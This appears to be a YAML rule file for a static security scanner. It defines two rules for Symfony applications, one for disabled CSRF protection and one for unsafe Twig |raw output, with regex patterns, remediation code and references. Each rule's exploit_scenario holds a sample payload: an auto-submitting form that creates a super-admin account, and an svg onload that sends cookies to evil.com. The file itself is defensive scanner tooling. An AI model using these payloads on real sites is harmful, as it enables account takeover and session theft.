- rule_id: FW-SYMFONY-002
  title: Missing CSRF Token Validation in Symfony Forms
  description: 'Detects Symfony applications where CSRF protection is disabled on forms or controllers that handle state-changing operations. Symfony provides built-in CSRF protection through the CsrfExtension
    and CSRF token manager, but this protection must be explicitly enabled or can be accidentally disabled through form configuration or missing annotations.

    '
  language: php
  category: framework_misuse
  severity: High
  confidence: 0.88
  cwe: CWE-352
  owasp: A01:2021-Broken Access Control
  tags:
  - symfony
  - csrf
  - forms
  - security
  - session-riding
  - php
  detection_layer: 4
  attack_surface_type: web
  patterns:
  - type: regex
    pattern: '''csrf_protection''\s*=>\s*false'
    description: CSRF protection explicitly disabled in form options
  - type: regex
    pattern: csrf_protection:\s*false
    description: CSRF protection disabled in YAML config
  - type: regex
    pattern: '''csrf_protection''\s*=>\s*false[\s\S]*?configureOptions'
    description: CSRF disabled in form type configureOptions
  - type: regex
    pattern: framework:\s*\n\s*csrf_protection:\s*\n\s*enabled:\s*false
    description: CSRF globally disabled in framework configuration
  - type: regex
    pattern: \$form\s*=\s*\$this->createFormBuilder\s*\([^)]*\)[\s\S]*?(?!csrf_protection)
    description: Form builder without CSRF configuration
  - type: regex
    pattern: isCsrfTokenValid\s*\([^)]*\)\s*;\s*$
    description: CSRF validation checked but result not used
  - type: regex
    pattern: '#\[Route\s*\([^)]*methods:\s*\[\s*["\x27]POST["\x27][\s\S]*?\][\s\S]*?\)\s*\]\s*\n\s*public\s+function\s+\w+\s*\(\s*Request\s+\$request(?![\s\S]*?csrf)'
    description: POST route handler without CSRF check
  anti_patterns:
  - '''csrf_protection''\s*=>\s*true'
  - csrf_protection:\s*true
  - isCsrfTokenValid\s*\([^)]*\)\s*\)
  - \$this->isCsrfTokenValid\s*\(
  - CsrfTokenManagerInterface
  - csrf_token\s*\(
  - CsrfExtension
  - _token
  - csrf_protection:\s*\n\s*enabled:\s*true
  - CsrfToken
  - '@csrf'
  - isCsrfTokenValid.*throw
  - CsrfTokenManager
  - csrf_field
  - submitForm.*_token
  bypass_variants:
  - description: CSRF validation present but uses weak token ID
    pattern: isCsrfTokenValid\s*\(\s*['"]['"]
  - description: CSRF enabled on form but AJAX endpoints bypass validation
    pattern: '#\[Route\([^)]*methods.*POST[^)]*\)\][\s\S]*?jsonResponse(?![\s\S]*?csrf)'
  - description: Token validated but not regenerated after use (replay attack)
    pattern: isCsrfTokenValid[\s\S]*?(?!.*refreshCsrfToken)
  evasion_indicators:
  - CSRF protection enabled globally but disabled on specific form types
  - Custom authentication filter that skips CSRF for API routes
  - SameSite cookie attribute relied upon instead of CSRF tokens
  encoding_variants:
  - type: form_option
    pattern: setDefaults\s*\(\s*\[[\s\S]*?['"]csrf_protection['"]\s*=>\s*false
  - type: config_override
    pattern: when@prod:[\s\S]*?csrf_protection:\s*false
  multi_function_chain_patterns:
  - POST form without CSRF -> user submits form -> state changed via CSRF attack
  - createFormBuilder() -> no csrf_protection -> form submitted cross-site
  - CSRF globally disabled -> all forms vulnerable -> account takeover via CSRF
  privilege_context_flags:
    requires_auth_context: true
    admin_only_risk: false
    escalation_vector: CSRF enables attackers to perform actions as authenticated users
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: false
    compliance_relevant: true
  probable_taint_paths:
  - source: Cross-origin form submission
    sink: Symfony controller handling state-changing request
    through: Disabled CSRF protection
  impact: 'Without CSRF protection, any website can submit forms to the Symfony

    application on behalf of authenticated users. Attackers craft hidden

    forms that auto-submit when victims visit their page. The browser

    includes the session cookie, and the application processes the request

    as legitimate. This enables unauthorized transactions, data

    modifications, and account changes.

    '
  remediation: "Enable and verify CSRF protection:\n\n```yaml\n# config/packages/framework.yaml\nframework:\n    csrf_protection:\n        enabled: true\n```\n\n```php\n// In Form Types\npublic function\
    \ configureOptions(OptionsResolver $resolver)\n{\n    $resolver->setDefaults([\n        'data_class' => Entity::class,\n        'csrf_protection' => true,\n        'csrf_field_name' => '_token',\n \
    \       'csrf_token_id' => 'entity_form',\n    ]);\n}\n\n// In Controllers for non-form actions\n#[Route('/delete/{id}', methods: ['POST'])]\npublic function delete(Request $request, int $id): Response\n\
    {\n    if (!$this->isCsrfTokenValid('delete-item', $request->request->get('_token'))) {\n        throw $this->createAccessDeniedException('Invalid CSRF token.');\n    }\n    // proceed with deletion\n\
    }\n```\n"
  references:
  - https://symfony.com/doc/current/security/csrf.html
  - https://cwe.mitre.org/data/definitions/352.html
  - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
  - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  context_awareness:
    surrounding_context_patterns:
    - createForm\s*\(
    - createFormBuilder\s*\(
    - handleRequest\s*\(
    - isSubmitted\s*\(
    taint_source_indicators:
    - \$request->request->get
    - \$request->getContent
    - \$form->getData
    taint_sink_indicators:
    - \$entityManager->persist
    - \$entityManager->flush
    - \$entityManager->remove
    sanitization_patterns:
    - isCsrfTokenValid\s*\(
    - csrf_protection.*true
    - _token
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: 'severity_weight * confidence * (financial_actions ? 1.5 : 1.0)'
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Symfony admin panel has CSRF protection disabled on its user

      management form. An attacker sends a phishing email to an admin

      with a link to a page containing a hidden form that submits a

      POST request to /admin/users/create with role=ROLE_SUPER_ADMIN.

      When the admin clicks the link, the form auto-submits, creating

      a new super admin account the attacker controls.

      '
    example_payload: <form action="https://target.com/admin/users/create" method="POST"><input type="hidden" name="username" value="attacker"/><input type="hidden" name="role" value="ROLE_SUPER_ADMIN"/><input
      type="hidden" name="password" value="p@ssw0rd"/></form><script>document.forms[0].submit();</script>
    attacker_objective: Perform state-changing actions as authenticated admin users via CSRF exploitation
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: medium
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: framework-aware
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - FW-SYMFONY-001
    - FW-SYMFONY-003
    - FW-ASPNET-001
    - FW-DJANGO-004
- rule_id: FW-SYMFONY-003
  title: Unsafe Twig raw Filter Usage in Symfony Templates
  description: 'Detects Symfony Twig templates that use the |raw filter or {% autoescape false %} with data that originates from user input, database records, or external APIs. The |raw filter disables
    Twig''s automatic output escaping, which is the primary defense against XSS in Symfony applications. Using |raw with untrusted data creates XSS vulnerabilities.

    '
  language: php
  category: framework_misuse
  severity: High
  confidence: 0.9
  cwe: CWE-79
  owasp: A03:2021-Injection
  tags:
  - symfony
  - twig
  - xss
  - template
  - raw-filter
  - php
  detection_layer: 4
  attack_surface_type: web
  patterns:
  - type: regex
    pattern: \{\{\s*\w+\.\w+\s*\|\s*raw\s*\}\}
    description: Twig variable output with raw filter
  - type: regex
    pattern: \{\{\s*\w+\s*\|\s*raw\s*\}\}
    description: Simple variable with raw filter
  - type: regex
    pattern: \{%\s*autoescape\s+false\s*%\}
    description: Autoescape disabled in template block
  - type: regex
    pattern: \{\{\s*\w+\.body\s*\|\s*raw\s*\}\}
    description: Body content output raw (common in CMS)
  - type: regex
    pattern: \{\{\s*\w+\.content\s*\|\s*raw\s*\}\}
    description: Content field output raw
  - type: regex
    pattern: \{\{\s*\w+\.description\s*\|\s*raw\s*\}\}
    description: Description field output raw
  - type: regex
    pattern: \{\{\s*app\.request\.\w+\s*\|\s*raw\s*\}\}
    description: Request data directly output raw
  - type: regex
    pattern: \{\{\s*include\s*\(\s*template_from_string\s*\(\s*\w+
    description: Dynamic template string from variable (SSTI risk)
  anti_patterns:
  - \|\s*e\s*\}\}
  - \|\s*escape\s*\}\}
  - \|\s*e\s*\(\s*["\x27]html["\x27]\s*\)\s*\}\}
  - \|\s*striptags\s*\|\s*raw
  - \|\s*purify\s*\|\s*raw
  - htmlpurifier
  - html_purifier\s*\(
  - \|\s*sanitize\s*\|\s*raw
  - autoescape\s+true
  - twig.*autoescape.*true
  - raw\s*\}\}[\s\S]*?{#\s*sanitized
  - DOMPurify
  - \|\s*\w+_sanitize\s*\|\s*raw
  - bleach
  - \|\s*clean\s*\|\s*raw
  bypass_variants:
  - description: Content sanitized server-side but additional data appended unsanitized
    pattern: \{\{\s*\w+\s*\|\s*purify\s*~\s*\w+\s*\|\s*raw\s*\}\}
  - description: Raw used after striptags which does not prevent all XSS
    pattern: \|\s*striptags\s*\(\s*["\x27]<\w+>["\x27]\s*\)\s*\|\s*raw
  - description: Raw used with custom filter that does incomplete sanitization
    pattern: \|\s*\w+_clean\s*\|\s*raw
  evasion_indicators:
  - Data flows through Twig extension that does not properly sanitize
  - Raw filter applied to translated message containing interpolated variables
  - Content from a trusted source that includes user-generated markup
  encoding_variants:
  - type: trans_raw
    pattern: \{\{\s*["\x27][^"\x27]*%\w+%[^"\x27]*["\x27]\s*\|\s*trans\s*\(\s*\{[^}]*\}\s*\)\s*\|\s*raw
  - type: format_raw
    pattern: \{\{\s*["\x27][^"\x27]*["\x27]\s*\|\s*format\s*\(\s*\w+\s*\)\s*\|\s*raw
  multi_function_chain_patterns:
  - user.bio -> {{ user.bio|raw }} -> stored XSS in profile page
  - article.content -> {{ article.content|raw }} -> stored XSS in CMS
  - app.request.get('q') -> {{ query|raw }} -> reflected XSS in search
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: XSS via raw filter enables session hijacking and account takeover
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: User input (form data, URL parameters, database records)
    sink: '{{ variable|raw }} in Twig template'
    through: Controller passing data to template context
  - source: Database field containing user-generated HTML
    sink: '{{ entity.field|raw }} in Twig template'
    through: Doctrine entity passed to template
  impact: 'Using the |raw filter with untrusted data disables Twig''s automatic

    HTML escaping, allowing attacker-controlled HTML and JavaScript to be

    rendered in the browser. This enables stored XSS (from database

    content), reflected XSS (from request parameters), and DOM-based XSS.

    Attackers can steal session cookies, redirect users, modify page

    content, and perform actions as the victim.

    '
  remediation: "Avoid |raw with untrusted data; use HTML Purifier for rich content:\n\n```twig\n{# UNSAFE - XSS vulnerability #}\n{# {{ article.content|raw }} #}\n\n{# SAFE - HTML Purifier sanitizes before\
    \ rendering #}\n{{ article.content|purify }}\n\n{# SAFE - escape (default behavior) #}\n{{ user.name }}\n\n{# For specific HTML attributes #}\n{{ user.website|e('url') }}\n```\n\n```php\n// Install\
    \ HTML Purifier bundle\n// composer require exercise/htmlpurifier-bundle\n\n// services.yaml\nexercise_html_purifier:\n    default:\n        HTML.Allowed: 'p,b,i,em,strong,a[href|title],ul,li,br'\n\n\
    // Custom Twig extension\nclass PurifyExtension extends AbstractExtension\n{\n    public function getFilters()\n    {\n        return [\n            new TwigFilter('purify', [$this, 'purify'], ['is_safe'\
    \ => ['html']]),\n        ];\n    }\n\n    public function purify(string $html): string\n    {\n        return $this->purifier->purify($html);\n    }\n}\n```\n"
  references:
  - https://twig.symfony.com/doc/3.x/filters/raw.html
  - https://symfony.com/doc/current/templates.html#output-escaping
  - https://cwe.mitre.org/data/definitions/79.html
  - https://owasp.org/Top10/A03_2021-Injection/
  context_awareness:
    surrounding_context_patterns:
    - \|\s*raw
    - autoescape\s+false
    - \.html\.twig
    - \{\{.*\}\}
    taint_source_indicators:
    - app\.request\.
    - \w+\.content
    - \w+\.body
    - \w+\.description
    taint_sink_indicators:
    - \|\s*raw\s*\}\}
    - autoescape\s+false
    - template_from_string
    sanitization_patterns:
    - \|\s*purify
    - \|\s*e\s*\}
    - \|\s*escape
    - \|\s*striptags
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: 'severity_weight * confidence * (stored_xss ? 1.5 : 1.0)'
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Symfony blog application renders article comments using

      {{ comment.text|raw }} in a Twig template. An attacker posts a

      comment containing:

      <svg onload="fetch(''https://evil.com/steal?c=''+document.cookie)">

      Every user who views the article page has their session cookie

      sent to the attacker''s server. The attacker uses the stolen cookies

      to impersonate users, including administrators.

      '
    example_payload: <svg/onload="fetch(`https://evil.com/steal?c=${document.cookie}`)">
    attacker_objective: Inject persistent XSS through the raw template filter to steal user sessions
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: framework-aware
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - FW-SYMFONY-001
    - FW-SYMFONY-002
    - FW-DJANGO-003
    - FW-NEXT-004
